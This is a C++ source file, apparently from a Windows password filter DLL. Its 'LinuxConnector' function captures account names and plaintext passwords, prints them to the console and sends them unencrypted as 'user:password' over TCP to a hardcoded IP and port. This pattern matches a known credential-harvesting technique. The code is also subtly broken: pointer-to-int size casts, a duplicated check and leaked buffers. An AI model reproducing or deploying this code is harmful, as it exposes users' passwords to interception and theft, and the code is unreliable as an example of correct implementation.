
#include "LinuxConnector.h"
#include <iostream>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#pragma comment(lib, "Ws2_32.lib")

unsigned __stdcall LinuxConnector(void * params) {
	printf("connector called\n");
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount *>(params);

	/* ------------- init winsock ---------------*/
	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	/* ----------------- ------------------ */
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	/* ------------ TODO: Fix argv and default port here from params passed ------------- */
	// Resolve the server address and port
	//iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
	iResult = getaddrinfo("192.168.0.144", "1234", &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	/* ----------------- --------------------- */
	SOCKET ConnectSocket = INVALID_SOCKET;
	// Attempt to connect to the first address returned by
    // the call to getaddrinfo
	ptr = result;
	printf("connection attempt to socket\n");
	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
	/* ----------- Now should have a ConnectSocket established ------------- */
#define DEFAULT_BUFLEN 512
	printf("socket connection established\n");
	int recvbuflen = DEFAULT_BUFLEN;

	//const char* sendbuf = "this is a test";
	char* user = getUser(params);
	char* pass = getPwd(params);
	int sz = strlen(user) + strlen(pass);
	char* buf = new char[sz + 3];
	printf("user %s password %s\n", user, pass);

	sprintf_s(buf, sz + 2, "%s:%s", user, pass);

	// here we do the LongCharToMultiByte() to mutate account name and password into char string
	char recvbuf[DEFAULT_BUFLEN];

	//  SEND BUFFER/CONTENT HERE !!!
	printf("Sending: %s\n", buf);

	iResult = send(ConnectSocket, buf, (int)strlen(buf), 0);
	// check result of send
	if (iResult == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	printf("Bytes Sent: %ld\n", iResult);

	// shutdown the connection for sending since no more data will be sent
	// the client can still use the ConnectSocket for receiving data
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}
	return 0;
}

char* getUser(void* params) {
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount*>(params);
	char* cUser;
	LPCWCH User = pf->AccountName->Buffer;
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, User, (int)(pf->AccountName->Length), NULL, 0, NULL, NULL);
	cUser = new char[size_needed+1];
	WideCharToMultiByte(CP_UTF8, 0, &pf->AccountName->Buffer[0], (int)&pf->AccountName->Length, &cUser[0], size_needed, NULL, NULL);
	cUser[size_needed] = NULL;
	return cUser;
}

char* getPwd(void* params) {
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount*>(params);
	char* cPassword;
	LPCWCH Password = pf->Password->Buffer;
	//int size_needed = WideCharToMultiByte(CP_UTF8, 0, Password, (int)(pf->Password->Length), NULL, 0, NULL, NULL);
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &pf->Password->Buffer[0], (int)pf->Password->Length, NULL, 0, NULL, NULL);

	cPassword = new char[size_needed+1];
	WideCharToMultiByte(CP_UTF8, 0, &Password[0], (int)&pf->Password->Length, &cPassword[0], size_needed, NULL, NULL);
	cPassword[size_needed] = NULL;
	return cPassword;
}